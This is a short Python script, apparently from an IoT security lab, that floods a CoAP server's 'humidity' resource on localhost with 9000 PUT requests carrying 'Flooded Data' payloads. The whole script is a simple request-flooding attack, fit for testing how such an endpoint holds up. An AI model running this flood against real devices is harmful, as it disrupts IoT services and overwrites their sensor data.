from coapthon.client.helperclient import HelperClient

ip = "127.0.0.1"
port = 5683
path = "humidity"

client = HelperClient(server=(ip, port))

try:
    for i in range(9000):  # Nombre de requêtes
        payload = f"Flooded Data {i}"
        response = client.put(path, payload)
        print(f"[{i}] PUT status: {response.code if response else 'No response'}")
finally:
    client.stop()
